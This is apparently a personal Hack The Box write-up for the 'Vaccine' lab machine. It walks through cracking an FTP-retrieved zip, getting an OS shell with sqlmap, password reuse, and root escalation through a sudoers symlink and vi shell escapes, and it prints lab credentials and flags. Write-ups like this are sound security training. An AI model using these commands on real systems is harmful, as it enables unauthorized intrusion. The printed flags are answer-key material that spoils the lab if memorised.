public:: true
tags:: ftp, postgres, sqlmap, sudo, gtfobins

- Via a FTP Anonymous connection I was able to download an encrypted archive `backup.zip`
	- Crack it with `john`
	  ```bash
	  # Create an hash that can be decrypted with john
	  > zip2john backup.zip > backup.zip.zip2john.txt
	  ```
		- zip password: 741852963
		  background-color:: pink
	- From the unencrypted archive I was able to retrieve creds to use in the website
		- **Username**: admin, **Password**: qwerty789
		  background-color:: pink
- `sqlmap` against the website return a shell with user `postgres`
	- ```bash
	  > sqlmap -u "http://10.129.95.174/dashboard.php?search=a" \
	         --cookie="PHPSESSID=r2i0ob4upjstu87lq6rrov5kdf" \
	         --os-shell
	  ```
- I can now retrieve some OS usernames from `/home`
	- ```bash
	  > ls -l /home
	  drwxr-xr-x 5 ftpuser ftpuser 4096 Jul 23  2021 ftpuser
	  drwxr-xr-x 4 simon   simon   4096 Jul 23  2021 simon
	  ```
- **User flag** at `/var/lib/postgresql/user.txt`
	- ec9b13ca4d6229cd5cc1e09980965bf7
	  background-color:: green
- In order to run `sudo -l` I need an interactive shell, the one from `sqlmap` is not
	- For that I used `socat` as explained [here](logseq://graph/HTB-Notes?block-id=65534bc6-4e92-4e47-aa27-491d85b83cdd)
	- The password for the user `postgres` is required to run such a command
		- By exploring the filesystem the plain-text password to connect to the DBMS can be found in `/var/www/html/dashboard.php`. Due to password reuse it happens to also be the password for the `postgres` OS user.
		  #+BEGIN_CAUTION
		  postgres:P@s5w0rd!
		  #+END_CAUTION
	- We can now check which command the current user can run via `sudo`
	  ```bash
	  postgres@vaccine:/var/www/html$ sudo -l
	  [sudo] password for postgres: 
	  Matching Defaults entries for postgres on vaccine:
	     	env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
	   	secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
	  
	  User postgres may run the following commands on vaccine:
	   	(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
	  ```
- ### Privesc
	- Now that we know that we are allowed to run the following exact command via `sudo` and so as `root`
	  ```bash
	  vi /etc/postgresql/11/main/pg_hba.conf
	  ```
	  and since I do have write access to the `/etc/postgresql/11/main` folder
	  ```bash
	  postgres@vaccine:/etc/postgresql/11/main$ mv pg_hba.conf pg_hba.conf.back
	  postgres@vaccine:/etc/postgresql/11/main$ ln -s ../../../../etc/sudoers pg_hba.conf
	  postgres@vaccine:/etc/postgresql/11/main$ ls -l
	  total 52
	  drwxr-xr-x 2 postgres postgres  4096 Jul 23  2021 conf.d
	  -rw-r--r-- 1 postgres postgres   315 Feb  3  2020 environment
	  -rw-r--r-- 1 postgres postgres   143 Feb  3  2020 pg_ctl.conf
	  lrwxrwxrwx 1 postgres postgres    23 Nov  8 17:44 pg_hba.conf -> ../../../../etc/sudoers
	  -rw-r----- 1 postgres postgres  4659 Nov  8 17:44 pg_hba.conf.back
	  ```
	  we could replace that file with a link to `/etc/sudoers` and grant us more powers
	  ```bash
	  sudo vi /etc/postgresql/11/main/pg_hba.conf
	  ```
	- **Root flag** at `/root/flag.txt`
		- dd6e058e814260bc70e9bbdef2715849
		  background-color:: green
- *Extra path to privesc*
	- According to [gtfobin](https://gtfobins.github.io/gtfobins/vi/#sudo) a shell can be executed out from `vim` without touching the filesystem it two different ways
		- While calling `vim`
		  logseq.order-list-type:: number
		  ```bash
		  vi -c ':!/bin/sh' /dev/null
		  ```
		  this specific example wouldn't have worked in our case because we were strictly limited about the way I we could call `vim` with `sudo`.
		- Within `vim`
		  logseq.order-list-type:: number
		  ```
		  > vi
		  :set shell=/bin/sh
		  :shell
		  ```